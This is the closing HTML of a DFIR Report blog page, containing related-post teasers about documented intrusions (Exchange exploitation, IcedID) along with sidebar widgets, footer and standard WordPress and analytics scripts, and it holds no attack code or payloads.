<div class="jp-relatedposts-items jp-relatedposts-items-visual jp-relatedposts-grid "><div class="jp-relatedposts-post jp-relatedposts-post0 jp-relatedposts-post-thumbs" data-post-id="4551" data-post-format="false"><a class="jp-relatedposts-post-a" href="https://thedfirreport.com/2021/11/15/exchange-exploit-leads-to-domain-wide-ransomware/" title="Exchange Exploit Leads to Domain Wide Ransomware" data-origin="5981" data-position="0"><img class="jp-relatedposts-post-img" loading="lazy" src="https://i0.wp.com/thedfirreport.com/wp-content/uploads/2021/11/ransom2.png?resize=350%2C200&amp;ssl=1" width="350" height="200" alt=""></a><h4 class="jp-relatedposts-post-title"><a class="jp-relatedposts-post-a" href="https://thedfirreport.com/2021/11/15/exchange-exploit-leads-to-domain-wide-ransomware/" title="Exchange Exploit Leads to Domain Wide Ransomware" data-origin="5981" data-position="0">Exchange Exploit Leads to Domain Wide Ransomware</a></h4><p class="jp-relatedposts-post-excerpt">Intro In late September, we observed an intrusion in which initial access was gained by the threat actor exploiting multiple vulnerabilities in Microsoft Exchange. The threat actors in this case were attributed to a group Microsoft tracks as Phosphorus (aka APT35, Charming Kitten, Newscaster, TA453, Magic Hound, etc.) which is…</p><time class="jp-relatedposts-post-date" datetime="November 15, 2021" style="display: block;">November 15, 2021</time><p class="jp-relatedposts-post-context">In "APT35"</p></div><div class="jp-relatedposts-post jp-relatedposts-post1 jp-relatedposts-post-thumbs" data-post-id="5706" data-post-format="false"><a class="jp-relatedposts-post-a" href="https://thedfirreport.com/2022/03/07/2021-year-in-review/" title="2021 Year In Review" data-origin="5981" data-position="1"><img class="jp-relatedposts-post-img" loading="lazy" src="https://i0.wp.com/thedfirreport.com/wp-content/uploads/2022/03/333333.png?resize=350%2C200&amp;ssl=1" width="350" height="200" alt=""></a><h4 class="jp-relatedposts-post-title"><a class="jp-relatedposts-post-a" href="https://thedfirreport.com/2022/03/07/2021-year-in-review/" title="2021 Year In Review" data-origin="5981" data-position="1">2021 Year In Review</a></h4><p class="jp-relatedposts-post-excerpt">As we come to the end of the first quarter of 2022, we want to take some time to look back over our cases from 2021, in aggregate, and look at some of the top tactics, techniques and procedures (TTP's) we observed. In total, we reported on 20 incidents in…</p><time class="jp-relatedposts-post-date" datetime="March 7, 2022" style="display: block;">March 7, 2022</time><p class="jp-relatedposts-post-context">Similar post</p></div><div class="jp-relatedposts-post jp-relatedposts-post2 jp-relatedposts-post-thumbs" data-post-id="3189" data-post-format="false"><a class="jp-relatedposts-post-a" href="https://thedfirreport.com/2021/06/20/from-word-to-lateral-movement-in-1-hour/" title="From Word to Lateral Movement in 1 Hour" data-origin="5981" data-position="2"><img class="jp-relatedposts-post-img" loading="lazy" src="https://i0.wp.com/thedfirreport.com/wp-content/uploads/2021/06/1.jpg?resize=350%2C200&amp;ssl=1" width="350" height="200" alt=""></a><h4 class="jp-relatedposts-post-title"><a class="jp-relatedposts-post-a" href="https://thedfirreport.com/2021/06/20/from-word-to-lateral-movement-in-1-hour/" title="From Word to Lateral Movement in 1 Hour" data-origin="5981" data-position="2">From Word to Lateral Movement in 1 Hour</a></h4><p class="jp-relatedposts-post-excerpt">Introduction&nbsp; In May 2021, we observed a threat actor conducting an intrusion utilizing the IcedID payloads for initial access. They later performed a number of techniques from host discovery to lateral movement, using RDP and SMB to access the file servers within an enterprise domain. IcedID (known as BokBot) first…</p><time class="jp-relatedposts-post-date" datetime="June 20, 2021" style="display: block;">June 20, 2021</time><p class="jp-relatedposts-post-context">In "adfind"</p></div></div></div>
</div>
<footer class="entry-footer">
<div class="entry-meta">
</div>
</footer>
</div>
</article>
<nav class="navigation post-navigation" aria-label="Posts">
<h2 class="screen-reader-text">Post navigation</h2>
<div class="nav-links"><div class="nav-previous"><a href="https://thedfirreport.com/2022/03/07/2021-year-in-review/" rel="prev">2021 Year In Review</a></div></div>
</nav>
</main>
</div>
<aside id="secondary" class="widget-area" style="position: relative; overflow: visible; box-sizing: border-box; min-height: 1px;">
<div class="theiaStickySidebar" style="padding-top: 0px; padding-bottom: 1px; position: relative; transform: none;"><section id="google_translate_widget-3" class="widget widget_google_translate_widget"><h2 class="widget-title">Translate</h2><div id="google_translate_element"><div class="skiptranslate goog-te-gadget" dir="ltr" style="display: none;"><div id=":0.targetLanguage"><select class="goog-te-combo" aria-label="Kalbos Vertėjo valdiklis"></select></div>Parėmė <span style="white-space:nowrap"><a class="goog-logo-link" href="https://translate.google.com" target="_blank"><img src="https://www.gstatic.com/images/branding/googlelogo/1x/googlelogo_color_42x16dp.png" width="37px" height="14px" style="padding-right: 3px" alt="Google Vertėjas">Vertėjas</a></span></div></div></section><section id="search-4" class="widget widget_search"><form role="search" method="get" class="search-form" action="https://thedfirreport.com/">
<label>
<span class="screen-reader-text">Search for:</span>
<input type="search" class="search-field" placeholder="Search …" value="" name="s">
</label>
<input type="submit" class="search-submit" value="Search">
</form></section><section id="blog_subscription-2" class="widget widget_blog_subscription jetpack_subscription_widget"><h2 class="widget-title">Subscribe to Blog via Email</h2>
<form action="#" method="post" accept-charset="utf-8" id="subscribe-blog-blog_subscription-2">
<div id="subscribe-text"><p>Enter your email address to subscribe to this blog and receive notifications of new posts by email.</p>
</div>
<p id="subscribe-email">
<label id="jetpack-subscribe-label" class="screen-reader-text" for="subscribe-field-blog_subscription-2">
Email Address </label>
<input type="email" name="email" required="required" value="" id="subscribe-field-blog_subscription-2" placeholder="Email Address">
</p>
<p id="subscribe-submit">
<input type="hidden" name="action" value="subscribe">
<input type="hidden" name="source" value="https://thedfirreport.com/2022/03/21/apt35-automates-initial-access-using-proxyshell/">
<input type="hidden" name="sub-type" value="widget">
<input type="hidden" name="redirect_fragment" value="subscribe-blog-blog_subscription-2">
<button type="submit" class="wp-block-button__link" name="jetpack_subscriptions_widget">
Subscribe </button>
</p>
</form>
</section><section id="twitter_timeline-3" class="widget widget_twitter_timeline"><h2 class="widget-title">Follow us on Twitter</h2><a class="twitter-timeline" data-width="220" data-theme="light" data-border-color="#e8e8e8" data-tweet-limit="10" data-lang="EN" data-partner="jetpack" data-chrome="noheader nofooter noborders transparent noscrollbar" href="https://twitter.com/@TheDFIRReport">My Tweets</a></section><section id="blog_subscription-4" class="widget widget_blog_subscription jetpack_subscription_widget"><h2 class="widget-title">Subscribe to Blog via Email</h2>
<form action="#" method="post" accept-charset="utf-8" id="subscribe-blog-blog_subscription-4">
<div id="subscribe-text"><p>Enter your email address to subscribe to this blog and receive notifications of new posts by email.</p>
</div>
<p id="subscribe-email">
<label id="jetpack-subscribe-label" class="screen-reader-text" for="subscribe-field-blog_subscription-4">
Email Address </label>
<input type="email" name="email" required="required" value="" id="subscribe-field-blog_subscription-4" placeholder="Email Address">
</p>
<p id="subscribe-submit">
<input type="hidden" name="action" value="subscribe">
<input type="hidden" name="source" value="https://thedfirreport.com/2022/03/21/apt35-automates-initial-access-using-proxyshell/">
<input type="hidden" name="sub-type" value="widget">
<input type="hidden" name="redirect_fragment" value="subscribe-blog-blog_subscription-4">
<button type="submit" class="wp-block-button__link" name="jetpack_subscriptions_widget">
Subscribe </button>
</p>
</form>
</section><div class="resize-sensor" style="position: absolute; inset: 0px; overflow: hidden; z-index: -1; visibility: hidden;"><div class="resize-sensor-expand" style="position: absolute; left: 0; top: 0; right: 0; bottom: 0; overflow: hidden; z-index: -1; visibility: hidden;"><div style="position: absolute; left: 0px; top: 0px; transition: all 0s ease 0s; width: 414px; height: 1213px;"></div></div><div class="resize-sensor-shrink" style="position: absolute; left: 0; top: 0; right: 0; bottom: 0; overflow: hidden; z-index: -1; visibility: hidden;"><div style="position: absolute; left: 0; top: 0; transition: 0s; width: 200%; height: 200%"></div></div></div></div></aside>
</div>
</div>
</div>
<footer id="colophon" class="site-footer" role="contentinfo">
<div class="copyright-area">
<div class="wrap">
<div class="site-info">
<a href="https://wordpress.org/">
Proudly powered by WordPress</a>
<span class="sep"> | </span>
Theme: FreeNews <span class="sep"> | </span> By <a href="https://themespiral.com/">ThemeSpiral.com</a>. </div>
<div class="footer-right-info">
</div>
</div>
</div>
</footer>
<button href="#" class="back-to-top" type="button"><i class="fa fa-long-arrow-up"></i>Go Top</button>
</div>
<script type="text/javascript">
		window.WPCOM_sharing_counts = {"https:\/\/thedfirreport.com\/2022\/03\/21\/apt35-automates-initial-access-using-proxyshell\/":5981};
	</script>
<script type="text/javascript" src="https://thedfirreport.com/wp-includes/js/dist/vendor/regenerator-runtime.min.js?ver=0.13.9" id="regenerator-runtime-js"></script>
<script type="text/javascript" src="https://thedfirreport.com/wp-includes/js/dist/vendor/wp-polyfill.min.js?ver=3.15.0" id="wp-polyfill-js"></script>
<script type="text/javascript" id="contact-form-7-js-extra">
/* <![CDATA[ */
var wpcf7 = {"api":{"root":"https:\/\/thedfirreport.com\/wp-json\/","namespace":"contact-form-7\/v1"}};
/* ]]> */
</script>
<script type="text/javascript" src="https://thedfirreport.com/wp-content/plugins/contact-form-7/includes/js/index.js?ver=5.5.6" id="contact-form-7-js"></script>
<script type="text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/js/navigation.min.js?ver=5.9.1" id="freenews-navigation-js"></script>
<script type="text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/js/skip-link-focus-fix.js?ver=5.9.1" id="freenews-skip-link-focus-fix-js"></script>
<script type="text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky-sidebar/ResizeSensor.min.js?ver=5.9.1" id="ResizeSensor-js"></script>
<script type="text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky-sidebar/theia-sticky-sidebar.min.js?ver=5.9.1" id="theia-sticky-sidebar-js"></script>
<script type="text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/slick/slick.min.js?ver=5.9.1" id="slick-js"></script>
<script type="text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/slick/slick-settings.js?ver=5.9.1" id="freenews-slick-settings-js"></script>
<script type="text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky/jquery.sticky.js?ver=5.9.1" id="jquery-sticky-js"></script>
<script type="text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky/sticky-setting.js?ver=5.9.1" id="freenews-sticky-settings-js"></script>
<script type="text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/marquee/jquery.marquee.min.js?ver=5.9.1" id="marquee-js"></script>
<script type="text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/marquee/marquee-settings.js?ver=5.9.1" id="freenews-marquee-settings-js"></script>
<script type="text/javascript" src="https://thedfirreport.com/wp-content/plugins/jetpack/_inc/build/twitter-timeline.min.js?ver=4.0.0" id="jetpack-twitter-timeline-js"></script>
<script type="text/javascript" src="https://thedfirreport.com/wp-content/plugins/jetpack/jetpack_vendor/automattic/jetpack-lazy-images/dist/intersection-observer.js?minify=false&amp;ver=ba2aa80003251440130b63de19cb609d" id="jetpack-lazy-images-polyfill-intersectionobserver-js"></script>
<script type="text/javascript" id="jetpack-lazy-images-js-extra">
/* <![CDATA[ */
var jetpackLazyImagesL10n = {"loading_warning":"Images are still loading. Please cancel your print and try again."};
/* ]]> */
</script>
<script type="text/javascript" src="https://thedfirreport.com/wp-content/plugins/jetpack/jetpack_vendor/automattic/jetpack-lazy-images/dist/lazy-images.js?minify=false&amp;ver=ae8c0bea6a07ab76470a02053fc74216" id="jetpack-lazy-images-js"></script>
<script type="text/javascript" id="wp_slimstat-js-extra">
/* <![CDATA[ */
var SlimStatParams = {"ajaxurl":"https:\/\/thedfirreport.com\/wp-admin\/admin-ajax.php","baseurl":"\/","dnt":"noslimstat,ab-item","ci":"YTo0OntzOjEyOiJjb250ZW50X3R5cGUiO3M6NDoicG9zdCI7czo4OiJjYXRlZ29yeSI7czoxMDoiODksODcsODgsMSI7czoxMDoiY29udGVudF9pZCI7aTo1OTgxO3M6NjoiYXV0aG9yIjtzOjY6ImVkaXRvciI7fQ--.4ad5264d31e8775d932857f2a6b15a2e"};
/* ]]> */
</script>
<script defer="" type="text/javascript" src="https://cdn.jsdelivr.net/wp/wp-slimstat/tags/4.9.0.1/wp-slimstat.min.js" id="wp_slimstat-js"></script>
<script type="text/javascript" src="https://www.google.com/recaptcha/api.js?render=6LdT96QZAAAAAPgYNKKHOXJj40TDn4FL6KFdhViu&amp;ver=3.0" id="google-recaptcha-js"></script>
<script type="text/javascript" id="wpcf7-recaptcha-js-extra">
/* <![CDATA[ */
var wpcf7_recaptcha = {"sitekey":"6LdT96QZAAAAAPgYNKKHOXJj40TDn4FL6KFdhViu","actions":{"homepage":"homepage","contactform":"contactform"}};
/* ]]> */
</script>
<script type="text/javascript" src="https://thedfirreport.com/wp-content/plugins/contact-form-7/modules/recaptcha/index.js?ver=5.5.6" id="wpcf7-recaptcha-js"></script>
<script type="text/javascript" id="google-translate-init-js-extra">
/* <![CDATA[ */
var _wp_google_translate_widget = {"lang":"en_US","layout":"0"};
/* ]]> */
</script>
<script type="text/javascript" src="https://thedfirreport.com/wp-content/plugins/jetpack/_inc/build/widgets/google-translate/google-translate.min.js?ver=5.9.1" id="google-translate-init-js"></script>
<script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit&amp;ver=5.9.1" id="google-translate-js"></script>
<script type="text/javascript" id="sharing-js-js-extra">
/* <![CDATA[ */
var sharing_js_options = {"lang":"en","counts":"1","is_stats_active":"1"};
/* ]]> */
</script>
<script type="text/javascript" src="https://thedfirreport.com/wp-content/plugins/jetpack/_inc/build/sharedaddy/sharing.min.js?ver=10.7" id="sharing-js-js"></script>
<script type="text/javascript" id="sharing-js-js-after">
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-twitter' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-twitter' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomtwitter', 'menubar=1,resizable=1,width=600,height=350' );
						return false;
					}
				} );
			} )();
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-facebook' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-facebook' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomfacebook', 'menubar=1,resizable=1,width=600,height=400' );
						return false;
					}
				} );
			} )();
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-linkedin' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-linkedin' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomlinkedin', 'menubar=1,resizable=1,width=580,height=450' );
						return false;
					}
				} );
			} )();
</script>
<script src="https://stats.wp.com/e-202212.js" defer="" type="text/javascript"></script>
<script type="text/javascript">
	_stq = window._stq || [];
	_stq.push([ 'view', {v:'ext',j:'1:10.7',blog:'175340963',post:'5981',tz:'0',srv:'thedfirreport.com'} ]);
	_stq.push([ 'clickTrackerInit', '175340963', '5981' ]);
</script>
<script defer="" src="https://static.cloudflareinsights.com/beacon.min.js/v652eace1692a40cfa3763df669d7439c1639079717194" integrity="sha512-Gi7xpJR8tSkrpF7aordPZQlW2DLtzUlZcumS8dMQjwDHEnw9I7ZLyiOj/6tZStRBGtGgN6ceN6cMH8z7etPGlw==" data-cf-beacon="{&quot;rayId&quot;:&quot;6ef364679c4f7888&quot;,&quot;version&quot;:&quot;2021.12.0&quot;,&quot;r&quot;:1,&quot;token&quot;:&quot;e6611380fbbe475a97dc9cf0a0e9fd2b&quot;,&quot;si&quot;:100}" crossorigin="anonymous"></script>


<img src="https://pixel.wp.com/g.gif?v=ext&amp;j=1%3A10.7&amp;blog=175340963&amp;post=5981&amp;tz=0&amp;srv=thedfirreport.com&amp;host=thedfirreport.com&amp;ref=&amp;fcp=1655&amp;rand=0.10257885882488171" alt="" width="6" height="5" id="wpstats"><div id="goog-gt-tt" class="skiptranslate" dir="ltr"><div style="padding: 8px;"><div><div class="logo"><img src="https://www.gstatic.com/images/branding/product/1x/translate_24dp.png" width="20" height="20" alt="Google Vertėjas"></div></div></div><div class="top" style="padding: 8px; float: left; width: 100%;"><h1 class="title gray">Originalus tekstas</h1></div><div class="middle" style="padding: 8px;"><div class="original-text"></div></div><div class="bottom" style="padding: 8px;"><div class="activity-links"><span class="activity-link">Pateikite geresnį vertimą</span><span class="activity-link"></span></div><div class="started-activity-container"><hr style="color: #CCC; background-color: #CCC; height: 1px; border: none;"><div class="activity-root"></div></div></div><div class="status-message" style="display: none;"></div></div><iframe scrolling="no" frameborder="0" allowtransparency="true" src="https://platform.twitter.com/widgets/widget_iframe.a58e82e150afc25eb5372dd55a98b778.html?origin=https%3A%2F%2Fthedfirreport.com" title="Twitter settings iframe" style="display: none;"></iframe><div class="goog-te-spinner-pos"><div class="goog-te-spinner-animation"><svg xmlns="http://www.w3.org/2000/svg" class="goog-te-spinner" width="96px" height="96px" viewBox="0 0 66 66"><circle class="goog-te-spinner-path" fill="none" stroke-width="6" stroke-linecap="round" cx="33" cy="33" r="30"></circle></svg></div></div><div><div class="grecaptcha-badge" data-style="bottomright" style="width: 256px; height: 60px; display: block; transition: right 0.3s ease 0s; position: fixed; bottom: 14px; right: -186px; box-shadow: gray 0px 0px 5px; border-radius: 2px; overflow: hidden;"><div class="grecaptcha-logo"><iframe title="reCAPTCHA" src="https://www.google.com/recaptcha/api2/anchor?ar=1&amp;k=6LdT96QZAAAAAPgYNKKHOXJj40TDn4FL6KFdhViu&amp;co=aHR0cHM6Ly90aGVkZmlycmVwb3J0LmNvbTo0NDM.&amp;hl=en&amp;v=zLD1nfkNCJC1kEswSRdSyd-p&amp;size=invisible&amp;cb=btzdh1k7wjgc" width="256" height="60" role="presentation" name="a-86wzcb6nueuw" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox"></iframe></div><div class="grecaptcha-error"></div><textarea id="g-recaptcha-response-100000" name="g-recaptcha-response" class="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea></div></div></body><iframe sandbox="allow-scripts" srcdoc="<!DOCTYPE html><body><script>(function(){/*

 Copyright The Closure Library Authors.
 SPDX-License-Identifier: Apache-2.0
*/
var d=&quot;function&quot;==typeof Object.create?Object.create:function(a){var b=function(){};b.prototype=a;return new b},f;if(&quot;function&quot;==typeof Object.setPrototypeOf)f=Object.setPrototypeOf;else{var g;a:{var k={a:!0},l={};try{l.__proto__=k;g=l.a;break a}catch(a){}g=!1}f=g?function(a,b){a.__proto__=b;if(a.__proto__!==b)throw new TypeError(a+&quot; is not extensible&quot;);return a}:null}var m=f,n=this||self,p=function(a){return a};/*

 SPDX-License-Identifier: Apache-2.0
*/
var q={};var r;var t=function(a,b){if(b!==q)throw Error(&quot;Bad secret&quot;);this.g=a},u=function(){};t.prototype=d(u.prototype);t.prototype.constructor=t;if(m)m(t,u);else for(var v in u)if(&quot;prototype&quot;!=v)if(Object.defineProperties){var w=Object.getOwnPropertyDescriptor(u,v);w&amp;&amp;Object.defineProperty(t,v,w)}else t[v]=u[v];t.prototype.toString=function(){return this.g.toString()};function x(a){if(void 0===r){var b=null;var c=n.trustedTypes;if(c&amp;&amp;c.createPolicy)try{b=c.createPolicy(&quot;goog#html&quot;,{createHTML:p,createScript:p,createScriptURL:p})}catch(e){n.console&amp;&amp;n.console.error(e.message)}r=b}b=r;b=null==b?void 0:b.createScriptURL(a);return new t(null!=b?b:a,q)};if(!function(){if(self.origin)return&quot;null&quot;===self.origin;if(&quot;&quot;!==location.host)return!1;try{return window.parent.escape(&quot;&quot;),!1}catch(a){return!0}}())throw Error(&quot;sandboxing error&quot;);
window.addEventListener(&quot;message&quot;,function(a){var b=a.ports[0];a=a.data;var c=a.callbackName.split(&quot;.&quot;),e=window;&quot;window&quot;===c[0]&amp;&amp;c.unshift();for(var h=0;h<c.length-1;h++)e[c[h]]={},e=e[c[h]];e[c[c.length-1]]=function(y){b.postMessage(JSON.stringify(y))};c=document.createElement(&quot;script&quot;);a=x(a.url);if(a instanceof t)a=a.g;else throw Error(&quot;Unexpected type when unwrapping TrustedResourceUrl&quot;);c.src=a;document.body.appendChild(c)},!0);}).call(this);
</script></body>" src="data:text/html;charset=UTF-8;base64,PCFET0NUWVBFIGh0bWw+PGJvZHk+PHNjcmlwdD4oZnVuY3Rpb24oKXsvKgoKIENvcHlyaWdodCBUaGUgQ2xvc3VyZSBMaWJyYXJ5IEF1dGhvcnMuCiBTUERYLUxpY2Vuc2UtSWRlbnRpZmllcjogQXBhY2hlLTIuMAoqLwp2YXIgZD0iZnVuY3Rpb24iPT10eXBlb2YgT2JqZWN0LmNyZWF0ZT9PYmplY3QuY3JlYXRlOmZ1bmN0aW9uKGEpe3ZhciBiPWZ1bmN0aW9uKCl7fTtiLnByb3RvdHlwZT1hO3JldHVybiBuZXcgYn0sZjtpZigiZnVuY3Rpb24iPT10eXBlb2YgT2JqZWN0LnNldFByb3RvdHlwZU9mKWY9T2JqZWN0LnNldFByb3RvdHlwZU9mO2Vsc2V7dmFyIGc7YTp7dmFyIGs9e2E6ITB9LGw9e307dHJ5e2wuX19wcm90b19fPWs7Zz1sLmE7YnJlYWsgYX1jYXRjaChhKXt9Zz0hMX1mPWc/ZnVuY3Rpb24oYSxiKXthLl9fcHJvdG9fXz1iO2lmKGEuX19wcm90b19fIT09Yil0aHJvdyBuZXcgVHlwZUVycm9yKGErIiBpcyBub3QgZXh0ZW5zaWJsZSIpO3JldHVybiBhfTpudWxsfXZhciBtPWYsbj10aGlzfHxzZWxmLHA9ZnVuY3Rpb24oYSl7cmV0dXJuIGF9Oy8qCgogU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IEFwYWNoZS0yLjAKKi8KdmFyIHE9e307dmFyIHI7dmFyIHQ9ZnVuY3Rpb24oYSxiKXtpZihiIT09cSl0aHJvdyBFcnJvcigiQmFkIHNlY3JldCIpO3RoaXMuZz1hfSx1PWZ1bmN0aW9uKCl7fTt0LnByb3RvdHlwZT1kKHUucHJvdG90eXBlKTt0LnByb3RvdHlwZS5jb25zdHJ1Y3Rvcj10O2lmKG0pbSh0LHUpO2Vsc2UgZm9yKHZhciB2IGluIHUpaWYoInByb3RvdHlwZSIhPXYpaWYoT2JqZWN0LmRlZmluZVByb3BlcnRpZXMpe3ZhciB3PU9iamVjdC5nZXRPd25Qcm9wZXJ0eURlc2NyaXB0b3IodSx2KTt3JiZPYmplY3QuZGVmaW5lUHJvcGVydHkodCx2LHcpfWVsc2UgdFt2XT11W3ZdO3QucHJvdG90eXBlLnRvU3RyaW5nPWZ1bmN0aW9uKCl7cmV0dXJuIHRoaXMuZy50b1N0cmluZygpfTtmdW5jdGlvbiB4KGEpe2lmKHZvaWQgMD09PXIpe3ZhciBiPW51bGw7dmFyIGM9bi50cnVzdGVkVHlwZXM7aWYoYyYmYy5jcmVhdGVQb2xpY3kpdHJ5e2I9Yy5jcmVhdGVQb2xpY3koImdvb2cjaHRtbCIse2NyZWF0ZUhUTUw6cCxjcmVhdGVTY3JpcHQ6cCxjcmVhdGVTY3JpcHRVUkw6cH0pfWNhdGNoKGUpe24uY29uc29sZSYmbi5jb25zb2xlLmVycm9yKGUubWVzc2FnZSl9cj1ifWI9cjtiPW51bGw9PWI/dm9pZCAwOmIuY3JlYXRlU2NyaXB0VVJMKGEpO3JldHVybiBuZXcgdChudWxsIT1iP2I6YSxxKX07aWYoIWZ1bmN0aW9uKCl7aWYoc2VsZi5vcmlnaW4pcmV0dXJuIm51bGwiPT09c2VsZi5vcmlnaW47aWYoIiIhPT1sb2NhdGlvbi5ob3N0KXJldHVybiExO3RyeXtyZXR1cm4gd2luZG93LnBhcmVudC5lc2NhcGUoIiIpLCExfWNhdGNoKGEpe3JldHVybiEwfX0oKSl0aHJvdyBFcnJvcigic2FuZGJveGluZyBlcnJvciIpOwp3aW5kb3cuYWRkRXZlbnRMaXN0ZW5lcigibWVzc2FnZSIsZnVuY3Rpb24oYSl7dmFyIGI9YS5wb3J0c1swXTthPWEuZGF0YTt2YXIgYz1hLmNhbGxiYWNrTmFtZS5zcGxpdCgiLiIpLGU9d2luZG93OyJ3aW5kb3ciPT09Y1swXSYmYy51bnNoaWZ0KCk7Zm9yKHZhciBoPTA7aDxjLmxlbmd0aC0xO2grKyllW2NbaF1dPXt9LGU9ZVtjW2hdXTtlW2NbYy5sZW5ndGgtMV1dPWZ1bmN0aW9uKHkpe2IucG9zdE1lc3NhZ2UoSlNPTi5zdHJpbmdpZnkoeSkpfTtjPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInNjcmlwdCIpO2E9eChhLnVybCk7aWYoYSBpbnN0YW5jZW9mIHQpYT1hLmc7ZWxzZSB0aHJvdyBFcnJvcigiVW5leHBlY3RlZCB0eXBlIHdoZW4gdW53cmFwcGluZyBUcnVzdGVkUmVzb3VyY2VVcmwiKTtjLnNyYz1hO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYyl9LCEwKTt9KS5jYWxsKHRoaXMpOwo8L3NjcmlwdD48L2JvZHk+" style="display: none;"></iframe></html>